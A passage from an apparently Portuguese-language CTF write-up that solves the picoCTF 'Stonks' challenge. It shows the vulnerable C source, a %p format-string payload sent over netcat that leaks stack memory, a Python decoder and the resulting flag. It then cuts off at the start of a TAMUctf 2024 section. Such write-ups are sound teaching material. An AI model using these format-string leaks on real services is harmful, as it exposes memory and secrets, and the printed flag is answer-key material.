</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=cp>#define FLAG_BUFFER 128
</span></span></span><span class=line><span class=cl><span class=cp>#define MAX_SYM_LEN 4
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>Stonks</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>shares</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>symbol</span><span class=p>[</span><span class=n>MAX_SYM_LEN</span> <span class=o>+</span> <span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>struct</span> <span class=n>Stonks</span> <span class=o>*</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Stonk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>typedef</span> <span class=k>struct</span> <span class=n>Portfolios</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>money</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Stonk</span> <span class=o>*</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=n>Portfolio</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>view_portfolio</span><span class=p>(</span><span class=n>Portfolio</span> <span class=o>*</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Portfolio as of &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>system</span><span class=p>(</span><span class=s>&#34;date&#34;</span><span class=p>);</span> <span class=c1>// TODO: implement this in C
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>Stonk</span> <span class=o>*</span><span class=n>head</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>head</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You don&#39;t own any stonks!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>head</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d shares of %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>head</span><span class=o>-&gt;</span><span class=n>shares</span><span class=p>,</span> <span class=n>head</span><span class=o>-&gt;</span><span class=n>symbol</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>head</span> <span class=o>=</span> <span class=n>head</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Stonk</span> <span class=o>*</span><span class=nf>pick_symbol_with_AI</span><span class=p>(</span><span class=kt>int</span> <span class=n>shares</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>shares</span> <span class=o>&lt;</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>Stonk</span> <span class=o>*</span><span class=n>stonk</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Stonk</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>stonk</span><span class=o>-&gt;</span><span class=n>shares</span> <span class=o>=</span> <span class=n>shares</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>AI_symbol_len</span> <span class=o>=</span> <span class=p>(</span><span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=n>MAX_SYM_LEN</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=n>MAX_SYM_LEN</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>&lt;</span> <span class=n>AI_symbol_len</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>stonk</span><span class=o>-&gt;</span><span class=n>symbol</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;A&#39;</span> <span class=o>+</span> <span class=p>(</span><span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mi>26</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=n>stonk</span><span class=o>-&gt;</span><span class=n>symbol</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>stonk</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>stonk</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>buy_stonks</span><span class=p>(</span><span class=n>Portfolio</span> <span class=o>*</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=n>api_buf</span><span class=p>[</span><span class=n>FLAG_BUFFER</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=n>FILE</span> <span class=o>*</span><span class=n>f</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;api&#34;</span><span class=p>,</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>f</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Flag file not found. Contact an admin.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>api_buf</span><span class=p>,</span> <span class=n>FLAG_BUFFER</span><span class=p>,</span> <span class=n>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>money</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>money</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>shares</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Stonk</span> <span class=o>*</span><span class=n>temp</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Using patented AI algorithms to buy stonks</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>money</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>shares</span> <span class=o>=</span> <span class=p>(</span><span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=n>money</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>temp</span> <span class=o>=</span> <span class=nf>pick_symbol_with_AI</span><span class=p>(</span><span class=n>shares</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>temp</span><span class=o>-&gt;</span><span class=n>next</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=o>-&gt;</span><span class=n>head</span> <span class=o>=</span> <span class=n>temp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>money</span> <span class=o>-=</span> <span class=n>shares</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Stonks chosen</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// TODO: Figure out how to read token from file, for now just ask
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>user_buf</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>300</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;What is your API token?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%300s&#34;</span><span class=p>,</span> <span class=n>user_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Buying stonks with token:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=n>user_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// TODO: Actually use key to interact with API
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>        <span class=nf>view_portfolio</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Portfolio</span> <span class=o>*</span><span class=nf>initialize_portfolio</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Portfolio</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Portfolio</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>-&gt;</span><span class=n>money</span> <span class=o>=</span> <span class=p>(</span><span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mi>2018</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>-&gt;</span><span class=n>head</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>free_portfolio</span><span class=p>(</span><span class=n>Portfolio</span> <span class=o>*</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>Stonk</span> <span class=o>*</span><span class=n>current</span> <span class=o>=</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>head</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>Stonk</span> <span class=o>*</span><span class=n>next</span> <span class=o>=</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=p>(</span><span class=n>current</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>next</span> <span class=o>=</span> <span class=n>current</span><span class=o>-&gt;</span><span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nf>free</span><span class=p>(</span><span class=n>current</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>current</span> <span class=o>=</span> <span class=n>next</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>argv</span><span class=p>[])</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>srand</span><span class=p>(</span><span class=nf>time</span><span class=p>(</span><span class=nb>NULL</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=n>Portfolio</span> <span class=o>*</span><span class=n>p</span> <span class=o>=</span> <span class=nf>initialize_portfolio</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>p</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Memory failure</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kt>int</span> <span class=n>resp</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome back to the trading app!</span><span class=se>\n\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;What would you like to do?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;1) Buy some stonks!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;2) View my portfolio</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%d&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>resp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>resp</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>buy_stonks</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=n>resp</span> <span class=o>==</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>view_portfolio</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>free_portfolio</span><span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Não recebemos nenhum arquivo binário compilado no chall.</p><p>Nesse chall, temos outra vulnerabilidade de format string. Dê uma olhada nessas linhas da função <code>buy_stonks</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>        <span class=kt>char</span> <span class=o>*</span><span class=n>user_buf</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=mi>300</span> <span class=o>+</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;What is your API token?</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>scanf</span><span class=p>(</span><span class=s>&#34;%300s&#34;</span><span class=p>,</span> <span class=n>user_buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Buying stonks with token:</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=n>user_buf</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>Precisamos saber onde o conteúdo de <code>api</code> está. Eu coloquei um monte de <code>%p</code> novamente porque parecia ser a forma mais simples de resolver:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>nc mercury.picoctf.net 27912
</span></span><span class=line><span class=cl>Welcome back to the trading app!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>What would you like to do?
</span></span><span class=line><span class=cl>1) Buy some stonks!
</span></span><span class=line><span class=cl>2) View my portfolio
</span></span><span class=line><span class=cl>1
</span></span><span class=line><span class=cl>Using patented AI algorithms to buy stonks
</span></span><span class=line><span class=cl>Stonks chosen
</span></span><span class=line><span class=cl>What is your API token?
</span></span><span class=line><span class=cl>%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
</span></span><span class=line><span class=cl>Buying stonks with token:
</span></span><span class=line><span class=cl>0x8a3b450,0x804b000,0x80489c3,0xf7f60d80,0xffffffff,0x1,0x8a39160,0xf7f6e110,0xf7f60dc7,(nil),0x8a3a180,0x1,0x8a3b430,0x8a3b450,0x6f636970,0x7b465443,0x306c5f49,0x345f7435,0x6d5f6c6c,0x306d5f79,0x5f79336e,0x32666331,0x30613130,0xffda007d,0xf7f9baf8,0xf7f6e440,0xf8bb5a00,0x1,(nil),0xf7dfdce9,
</span></span><span class=line><span class=cl>Portfolio as of Fri Aug  2 05:05:33 UTC 2024
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>1 shares of SXD
</span></span><span class=line><span class=cl>1 shares of NJF
</span></span><span class=line><span class=cl>1 shares of CN
</span></span><span class=line><span class=cl>4 shares of HXQ
</span></span><span class=line><span class=cl>3 shares of UR
</span></span><span class=line><span class=cl>81 shares of ONKL
</span></span><span class=line><span class=cl>188 shares of F
</span></span><span class=line><span class=cl>451 shares of G
</span></span><span class=line><span class=cl>327 shares of ANLB
</span></span><span class=line><span class=cl>175 shares of U
</span></span><span class=line><span class=cl>189 shares of K
</span></span><span class=line><span class=cl>Goodbye!
</span></span></code></pre></td></tr></table></div></div><p>Criei um script em python para olhar para o output e gerar uma solução:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=s1>&#39;0x8a3b450,0x804b000,0x80489c3,0xf7f60d80,0xffffffff,0x1,0x8a39160,0xf7f6e110,0xf7f60dc7,(nil),0x8a3a180,0x1,0x8a3b430,0x8a3b450,0x6f636970,0x7b465443,0x306c5f49,0x345f7435,0x6d5f6c6c,0x306d5f79,0x5f79336e,0x32666331,0x30613130,0xffda007d,0xf7f9baf8,0xf7f6e440,0xf8bb5a00,0x1,(nil),0xf7dfdce9&#39;</span>
</span></span><span class=line><span class=cl><span class=n>output</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;,&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>decoded</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>output</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span><span class=p>[</span><span class=n>_</span><span class=p>]</span> <span class=o>=</span> <span class=n>output</span><span class=p>[</span><span class=n>_</span><span class=p>]</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>decoded</span> <span class=o>+=</span> <span class=nb>int</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>output</span><span class=p>[</span><span class=n>_</span><span class=p>],</span> <span class=mi>16</span><span class=p>),</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()[::</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=p>(</span><span class=ne>UnicodeDecodeError</span><span class=p>,</span> <span class=ne>ValueError</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>decoded</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>flag: <code>picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}</code></p><h1 id=challenge-extra->Challenge extra ^^<a hidden class=anchor aria-hidden=true href=#challenge-extra->#</a></h1><h2 id=tamuctf-2024---admin-panel>TAMUctf 2024 - admin panel<a hidden class=anchor aria-hidden=true href=#tamuctf-2024---admin-panel>#</a></h2><p>DISCLAIMER: Eu não resolvi esse challenge durante o CTF.</p><p>Vamos começar :)</p><p>O desafio nos fornece um arquivo zip. Ao descompactá-lo, obtemos uma libc, um arquivo ld, um arquivo executável e um arquivo de código fonte. Vamos dar uma olhada no código fonte:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
